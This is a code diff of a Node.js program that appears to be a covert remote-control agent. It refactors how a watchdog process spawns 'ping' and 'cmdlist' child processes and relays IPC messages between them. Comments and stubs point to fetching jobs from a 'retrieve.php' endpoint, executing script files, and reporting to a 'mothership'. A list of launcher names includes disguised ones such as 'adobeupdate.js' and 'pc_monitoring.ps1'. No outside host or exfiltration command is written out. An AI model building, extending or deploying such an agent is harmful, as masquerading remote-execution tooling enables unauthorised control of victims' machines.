@@ -1,8 +1,9 @@
-// 20260702-0945
+// 20260705-0849
 // https://onecompiler.com/nodejs#draft-yf7t
 
 // TODO
 // TEST
+// REVIEW
 // anchor
 const { execFile } = require('child_process');
 const net = require('net');
@@ -296,6 +297,15 @@ class CmdConfig {
     #__launchscriptfname = ''; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
     #__childprocess = null; 
     #__childcmds = [];
+    #__parentcmdconfig = null;
+
+    set parentcmdconfig(value) {
+        return this.#__parentcmdconfig = value;
+    };
+
+    get parentcmdconfig() {
+        return this.#__parentcmdconfig;
+    };
 
     get childprocess() {
         return this.#__childprocess;
@@ -303,6 +313,13 @@ class CmdConfig {
 
     get launchscriptfname() {
         return this.#__launchscriptfname;
+    };
+
+    set cmdname(value) {
+        if ( CmdConfig.isCmdExist(value)  )
+            this.#__cmdname = value;
+        else
+            throw new Error('cmd is not supported ['+value+']');
     };
 
     get cmdname() {
@@ -323,20 +340,25 @@ class CmdConfig {
 
         return null;
     };
-
+    
     get childcmds() {
+        if ( ! this.#__childcmds )
+            this.#__childcmds = [];
+        
         return this.#__childcmds;
     };
 
     loopfunc = async () => { logmsg('doing some work inside loop...'); }; // should be overriden
 
-    parentcmdconfig = null;
+    newCmdConfig(tcmdname) {
+        let childcmd = new CmdConfig(tcmdname, this);
+        this.addchildcmd(childcmd);
+    };
 
-    constructor(tcmdname) {
-        if ( CmdConfig.isCmdExist(tcmdname)  )
-            this.#__cmdname = tcmdname;
-        else
-            throw new Error('cmd is not supported ['+tcmdname+']');
+    constructor(tcmdname, cmdconfig) {
+        this.cmdname = tcmdname;
+        this.parentcmdconfig = cmdconfig;
+        
     };
 
     static cmdfuncs = {
@@ -421,17 +443,26 @@ class CmdConfig {
 
     // used by watchdog to relay messages between ping and cmdlist
     processMessage(msg) {
+        logmsg('starting');
+        
+        let parentcmd = this.parentcmdconfig;
+
+        if ( ! parentcmd )
+            return;
+
         let src = msg.src;
         let dest = msg.dest;
         let payload = msg.payload;
-
-        let destcmd = this.getChildCmd(destcmd.cmdname);
+        
+        let destcmd = parentcmd.getChildCmd(dest); // TEST anchor
 
         if ( ! destcmd ) {
-            throw new Error(`could not find ${destcmd.cmdname} in child cmds list`);
+            throw new Error('could not obtain child cmd for '+dest);
         }
 
-        sendMessage(destcmd, src, payload);
+        this.sendMessage(destcmd, src, payload);
+
+        logmsg('finished');
     };
 
     sendMessage(destcmd, src, msgpayload) {
@@ -453,7 +484,9 @@ class CmdConfig {
             ts:getTimestamp()
         }
 
-        if ( childp.writable && ! childp.killed ) {
+        if ( childp.connected && ! childp.killed ) {
+            logmsg('sending message to child: '+ JSON.stringify(msgout)); // anchor
+
             childp.send(msgout);
         }
 
@@ -482,7 +515,7 @@ class CmdConfig {
         child.on('message', (message) => {
             logmsg('[YER]incomming message: ' + JSON.stringify(message));
 
-            this.processMessage(message);
+            this.processMessage(message);// anchor 202607042025
         });
         
         child.on('exit', (code) => {
@@ -752,7 +785,7 @@ function isValidHttpUrl(string) {
     try {
         const url = new URL(string);
         return url.protocol === 'http:' || url.protocol === 'https:';
-    } catch (_) {
+    } catch (error) {
         return false;  
     }
 }
@@ -950,8 +983,9 @@ ensureSingleInstancePipe(systemstate.cmdconfig.cmdfunc);
 
 // --- IPC for current running process: message send/receive
 
+// overriden by child cmds (ping, cmdlist)
 var handleMessage = function(msg) {
-    // overriden by child cmds (ping, cmdlist)
+    throw new Error('FATAL ERROR -- function must be overriden');
 }
 
 // receives messages from parent process -- should be used by cmdlist, ping
@@ -963,7 +997,7 @@ process.on('message', (message) => {
     logmsg(`[XAW]incomming message:` + JSON.stringify(message));
 
     if ( handleMessage ) {
-        handleMessage(message);
+        handleMessage(message); // anchor
     }
 
 });
@@ -1028,25 +1062,23 @@ function startup() {
 function watchdog() {
     logmsg('starting');
 
-    let pingcmd = new CmdConfig('ping');
-    let cmdlistcmd = new CmdConfig('cmdlist');
-    
-    systemstate.cmdconfig.addchildcmd(pingcmd);
-    systemstate.cmdconfig.addchildcmd(cmdlistcmd);
+    let watchdogcmd = systemstate.cmdconfig;
+    watchdogcmd.newCmdConfig('ping');
+    watchdogcmd.newCmdConfig('cmdlist');
 
-    let childcmds = systemstate.cmdconfig.childcmds;
-    
-    let cmdconfig = systemstate.cmdconfig;
+    let childcmds = watchdogcmd.childcmds;
 
-    cmdconfig.loopfunc = () => {
+    watchdogcmd.loopfunc = () => {
+
         for ( let i = 0; i<childcmds.length; i++) {
             let childcmd = childcmds[i];
     
             childcmd.activate();
-        }    
+        }
+
     };
 
-    cmdconfig.loop();
+    watchdogcmd.loop();
 
     logmsg('finished');
 }
@@ -1222,16 +1254,32 @@ function executeJob(clientjob) {
     logmsg('finished');
 }
 
+function cmdlist_handleMessage(msg) {
+    logmsg('starting');
+    // parse msg and execute job
+
+    // for execute_cmdlist, grab job using retrieve.php
+    // other jobs, will have to send path to script file for execution
+    // ping has to create the script file
+    logmsg('finished');
+}
+
 function cmdlist() {
     logmsg('starting');
 
-    let cmdconfig = systemstate.cmdconfig;
+    let cmdlistcmd = systemstate.cmdconfig;
 
-    cmdconfig.loopfunc = () => {
+    if ( cmdlistcmd.cmdname != 'cmdlist' ) {
+        throw new Error('cmdlist routine must only be called from cmdlist cmd');
+    }
+
+    handleMessage = cmdlist_handleMessage;
+
+    cmdlistcmd.loopfunc = () => {
         logmsg("cmdlist doing some work...");
     };
 
-    cmdconfig.loop();
+    cmdlistcmd.loop();
 
     logmsg('finished');
 }
@@ -1302,3 +1350,5 @@ function logEventMothership(event_code, kvp) {
 }
 
 // ---
+
+
